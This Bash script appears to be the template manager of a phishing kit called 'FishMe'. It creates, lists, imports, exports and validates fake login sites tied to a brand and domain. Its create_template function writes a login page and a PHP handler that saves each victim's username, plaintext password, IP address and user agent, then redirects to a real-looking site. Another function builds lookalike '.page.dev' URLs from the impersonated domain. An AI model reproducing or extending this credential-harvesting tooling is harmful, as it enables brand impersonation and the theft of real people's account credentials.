#!/bin/bash

TEMPLATES_DIR="${BASE_DIR}/templates"
TEMPLATE_BACKUP_DIR="${BASE_DIR}/.backups/templates"

init_template_manager() {
    mkdir -p "$TEMPLATE_BACKUP_DIR"
}

list_templates() {
    echo "Available Templates:"
    echo "===================="
    
    local i=1
    for template_dir in "${TEMPLATES_DIR}"/*; do
        if [[ -d "$template_dir" ]]; then
            local template_name
            template_name=$(basename "$template_dir")
            local site_json="${template_dir}/site.json"
            
            if [[ -f "$site_json" ]]; then
                local display_name
                display_name=$(grep -oP '"name":"[^"]+"' "$site_json" | cut -d'"' -f4)
                local brand
                brand=$(grep -oP '"brand":"[^"]+"' "$site_json" | cut -d'"' -f4)
                local category
                category=$(grep -oP '"category":"[^"]+"' "$site_json" | cut -d'"' -f4)
                
                printf "  ${GREEN}[%d]${RESET} ${BOLD}%s${RESET} (%s) - %s\n" "$i" "$display_name" "$brand" "$category"
            else
                printf "  ${GREEN}[%d]${RESET} ${BOLD}%s${RESET} (no config)\n" "$i" "$template_name"
            fi
            ((i++))
        fi
    done
}

get_sub_templates() {
    local template_name="$1"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    local sub_templates=()
    
    # If template_name already contains a path separator, it's already a sub-template
    if [[ "$template_name" == */* ]]; then
        echo "main"
        return
    fi
    
    # Check if main folder has site.json
    if [[ -f "${template_dir}/site.json" ]]; then
        sub_templates+=("main")
    fi
    
    # Check for sub-directories with site.json
    for subdir in "${template_dir}"/*; do
        if [[ -d "$subdir" && -f "${subdir}/site.json" ]]; then
            local subdir_name
            subdir_name=$(basename "$subdir")
            sub_templates+=("$subdir_name")
        fi
    done
    
    echo "${sub_templates[@]}"
}

select_sub_template() {
    local template_name="$1"
    
    # If template_name already contains a path separator, it's already a sub-template
    if [[ "$template_name" == */* ]]; then
        echo "main"
        return
    fi
    
    # Check if selection already complete (highest priority)
    if [[ "${SUB_TEMPLATE_SELECTION_COMPLETE}" == "1" ]]; then
        if [[ -n "${SELECTED_SUB_TEMPLATE}" ]]; then
            echo "${SELECTED_SUB_TEMPLATE}"
        else
            echo "main"
        fi
        return
    fi
    
    # Check if selection already in progress or done
    if [[ -n "${SUB_TEMPLATE_SELECTION_IN_PROGRESS}" ]] || [[ -n "${SELECTED_SUB_TEMPLATE}" ]]; then
        if [[ -n "${SELECTED_SUB_TEMPLATE}" ]]; then
            echo "${SELECTED_SUB_TEMPLATE}"
        else
            echo "main"
        fi
        return
    fi
    
    # Check if selection already done (using FINAL_SITE_NAME)
    if [[ -n "${FINAL_SITE_NAME}" ]]; then
        # Extract sub-template from FINAL_SITE_NAME if it contains a path separator
        if [[ "$FINAL_SITE_NAME" == */* ]]; then
            local sub_part="${FINAL_SITE_NAME#*/}"
            echo "$sub_part"
        else
            echo "main"
        fi
        return
    fi
    
    local sub_templates=($(get_sub_templates "$template_name"))
    
    if [[ ${#sub_templates[@]} -le 1 ]]; then
        echo "${sub_templates[0]:-main}"
        return
    fi
    
    # Set flag to prevent re-selection
    export SUB_TEMPLATE_SELECTION_IN_PROGRESS="1"
    
    echo ""
    echo "${CYAN}Multiple templates found in '$template_name':${RESET}"
    echo "=========================================="
    
    local i=1
    for sub in "${sub_templates[@]}"; do
        if [[ "$sub" == "main" ]]; then
            printf "  ${GREEN}[%d]${RESET} ${BOLD}Main Template${RESET} (${template_name})\n" "$i"
        else
            local sub_json="${TEMPLATES_DIR}/${template_name}/${sub}/site.json"
            local sub_name
            sub_name=$(grep -oP '"name":"[^"]+"' "$sub_json" 2>/dev/null | cut -d'"' -f4)
            printf "  ${GREEN}[%d]${RESET} ${BOLD}%s${RESET} (%s)\n" "$i" "${sub_name:-$sub}" "$sub"
        fi
        ((i++))
    done
    
    echo ""
    read -p "Select template to host [1-${#sub_templates[@]}]: " selection
    
    if [[ "$selection" =~ ^[0-9]+$ ]] && [[ "$selection" -ge 1 ]] && [[ "$selection" -le ${#sub_templates[@]} ]]; then
        local selected="${sub_templates[$((selection-1))]}"
        export SELECTED_SUB_TEMPLATE="$selected"
        unset SUB_TEMPLATE_SELECTION_IN_PROGRESS
        echo "$selected"
    else
        echo "Invalid selection. Using main template."
        export SELECTED_SUB_TEMPLATE="main"
        unset SUB_TEMPLATE_SELECTION_IN_PROGRESS
        echo "main"
    fi
}

get_template_info() {
    local template_name="$1"
    local site_json="${TEMPLATES_DIR}/${template_name}/site.json"
    
    if [[ ! -f "$site_json" ]]; then
        echo "Template '$template_name' not found."
        return 1
    fi
    
    echo "Template Information:"
    echo "===================="
    echo "Name: $(grep -oP '"name":"[^"]+"' "$site_json" | cut -d'"' -f4)"
    echo "Slug: $(grep -oP '"slug":"[^"]+"' "$site_json" | cut -d'"' -f4)"
    echo "Brand: $(grep -oP '"brand":"[^"]+"' "$site_json" | cut -d'"' -f4)"
    echo "Domain: $(grep -oP '"domain":"[^"]+"' "$site_json" | cut -d'"' -f4)"
    echo "Category: $(grep -oP '"category":"[^"]+"' "$site_json" | cut -d'"' -f4)"
    echo "Entry Page: $(grep -oP '"entry":"[^"]+"' "$site_json" | cut -d'"' -f4)"
    echo ""
    echo "Files:"
    ls -la "${TEMPLATES_DIR}/${template_name}/" 2>/dev/null
}

create_template() {
    local template_name="$1"
    local display_name="$2"
    local brand="$3"
    local domain="$4"
    
    if [[ -z "$template_name" ]]; then
        echo "Usage: create_template <name> <display_name> <brand> <domain>"
        return 1
    fi
    
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ -d "$template_dir" ]]; then
        echo "Template '$template_name' already exists."
        return 1
    fi
    
    mkdir -p "$template_dir"
    cat > "${template_dir}/site.json" << EOF
{
  "name": "${display_name:-$template_name}",
  "slug": "${template_name}",
  "brand": "${brand:-Custom}",
  "domain": "${domain:-example.com}",
  "category": "custom",
  "description": "Custom template created via FishMe",
  "entry": "login.html",
  "allocated_url": "$(generate_allocated_url "$template_name")"
}
EOF
    cat > "${template_dir}/login.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }
        h2 { text-align: center; color: #333; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign In</h2>
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
EOF
    cat > "${template_dir}/login.php" << 'EOF'
<?php
require_once '../../config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitizeInput($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    
    if (!empty($username) && !empty($password)) {
        $capture = [
            'username' => $username,
            'password' => $password,
            'template' => basename(__DIR__),
            'ip' => getClientIP(),
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        saveCapture($capture);
        header('Location: https://example.com');
        exit;
    }
}
?>
EOF
    
    echo "Template '$template_name' created successfully."
    echo "Location: $template_dir"
    echo "Edit the files to customize your template."
}

delete_template() {
    local template_name="$1"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ ! -d "$template_dir" ]]; then
        echo "Template '$template_name' not found."
        return 1
    fi
    local backup_dir="${TEMPLATE_BACKUP_DIR}/${template_name}_$(date +%Y%m%d_%H%M%S)"
    cp -r "$template_dir" "$backup_dir"
    
    rm -rf "$template_dir"
    
    echo "Template '$template_name' deleted."
    echo "Backup saved to: $backup_dir"
}

backup_template() {
    local template_name="$1"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ ! -d "$template_dir" ]]; then
        echo "Template '$template_name' not found."
        return 1
    fi
    
    local backup_dir="${TEMPLATE_BACKUP_DIR}/${template_name}_$(date +%Y%m%d_%H%M%S)"
    cp -r "$template_dir" "$backup_dir"
    
    echo "Template '$template_name' backed up to: $backup_dir"
}

restore_template() {
    local backup_name="$1"
    local backup_dir="${TEMPLATE_BACKUP_DIR}/${backup_name}"
    
    if [[ ! -d "$backup_dir" ]]; then
        echo "Backup '$backup_name' not found."
        echo "Available backups:"
        ls -1 "$TEMPLATE_BACKUP_DIR"
        return 1
    fi
    
    local template_name
    template_name=$(echo "$backup_name" | sed 's/_.*$//')
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    if [[ -d "$template_dir" ]]; then
        backup_template "$template_name"
    fi
    
    cp -r "$backup_dir" "$template_dir"
    
    echo "Template '$template_name' restored from backup."
}

list_backups() {
    echo "Available Template Backups:"
    echo "============================"
    
    if [[ ! -d "$TEMPLATE_BACKUP_DIR" ]] || [[ -z "$(ls -A "$TEMPLATE_BACKUP_DIR")" ]]; then
        echo "No backups found."
        return
    fi
    
    local i=1
    for backup_dir in "${TEMPLATE_BACKUP_DIR}"/*; do
        if [[ -d "$backup_dir" ]]; then
            local backup_name
            backup_name=$(basename "$backup_dir")
            local template_name
            template_name=$(echo "$backup_name" | sed 's/_.*$//')
            local backup_date
            backup_date=$(echo "$backup_name" | sed 's/.*_//' | sed 's/\([0-9]\{8\}\)_\([0-9]\{6\}\)/\1 \2/')
            
            printf "  ${GREEN}[%d]${RESET} ${BOLD}%s${RESET} - %s\n" "$i" "$template_name" "$backup_date"
            ((i++))
        fi
    done
}

export_template() {
    local template_name="$1"
    local output_dir="${2:-${BASE_DIR}/exports}"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ ! -d "$template_dir" ]]; then
        echo "Template '$template_name' not found."
        return 1
    fi
    
    mkdir -p "$output_dir"
    
    local archive_name="${template_name}_$(date +%Y%m%d_%H%M%S).tar.gz"
    local archive_path="${output_dir}/${archive_name}"
    
    tar -czf "$archive_path" -C "$TEMPLATES_DIR" "$template_name"
    
    echo "Template '$template_name' exported to: $archive_path"
}

import_template() {
    local archive_path="$1"
    
    if [[ ! -f "$archive_path" ]]; then
        echo "Archive not found: $archive_path"
        return 1
    fi
    local temp_dir
    temp_dir=$(mktemp -d)
    
    tar -xzf "$archive_path" -C "$temp_dir"
    local extracted_dir
    extracted_dir=$(find "$temp_dir" -maxdepth 1 -type d -not -name "$temp_dir" | head -1)
    
    if [[ -z "$extracted_dir" ]]; then
        echo "Invalid archive format."
        rm -rf "$temp_dir"
        return 1
    fi
    
    local template_name
    template_name=$(basename "$extracted_dir")
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    if [[ -d "$template_dir" ]]; then
        echo "Template '$template_name' already exists."
        read -p "Overwrite? [y/N]: " overwrite
        if [[ "${overwrite,,}" != "y" ]]; then
            rm -rf "$temp_dir"
            return 1
        fi
        backup_template "$template_name"
        rm -rf "$template_dir"
    fi
    
    mv "$extracted_dir" "$template_dir"
    rm -rf "$temp_dir"
    
    echo "Template '$template_name' imported successfully."
}

validate_template() {
    local template_name="$1"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ ! -d "$template_dir" ]]; then
        echo "Template '$template_name' not found."
        return 1
    fi
    
    echo "Validating template: $template_name"
    echo "================================"
    
    local errors=0
    if [[ ! -f "${template_dir}/site.json" ]]; then
        echo "  ${RED}[!]${RESET} Missing site.json"
        ((errors++))
    else
        echo "  ${GREEN}[✓]${RESET} site.json exists"
        if ! jq empty "${template_dir}/site.json" 2>/dev/null; then
            echo "  ${RED}[!]${RESET} Invalid JSON in site.json"
            ((errors++))
        else
            echo "  ${GREEN}[✓]${RESET} Valid JSON structure"
        fi
    fi
    local entry_file
    entry_file=$(grep -oP '"entry":"[^"]+"' "${template_dir}/site.json" 2>/dev/null | cut -d'"' -f4)
    
    if [[ -n "$entry_file" ]]; then
        if [[ -f "${template_dir}/${entry_file}" ]]; then
            echo "  ${GREEN}[✓]${RESET} Entry file exists: $entry_file"
        else
            echo "  ${RED}[!]${RESET} Entry file missing: $entry_file"
            ((errors++))
        fi
    fi
    if [[ -f "${template_dir}/login.php" ]]; then
        echo "  ${GREEN}[✓]${RESET} login.php exists"
    else
        echo "  ${YELLOW}[!]${RESET} login.php missing (captures may not work)"
    fi
    
    echo ""
    if [[ $errors -eq 0 ]]; then
        echo "  ${GREEN}Template is valid!${RESET}"
        return 0
    else
        echo "  ${RED}Template has $errors error(s)${RESET}"
        return 1
    fi
}

generate_allocated_url() {
    local template_name="$1"
    local sub_template="${2:-main}"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    # If template_name already contains a path separator, use it directly
    if [[ "$template_name" == */* ]]; then
        template_dir="${TEMPLATES_DIR}/${template_name}"
    elif [[ "$sub_template" != "main" ]]; then
        template_dir="${template_dir}/${sub_template}"
    fi
    
    local random_string
    random_string=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
    local site_domain
    site_domain=$(grep -oP '"domain":"[^"]+"' "${template_dir}/site.json" 2>/dev/null | cut -d'"' -f4)
    echo "${site_domain:-example.com}-${random_string}.page.dev"
}
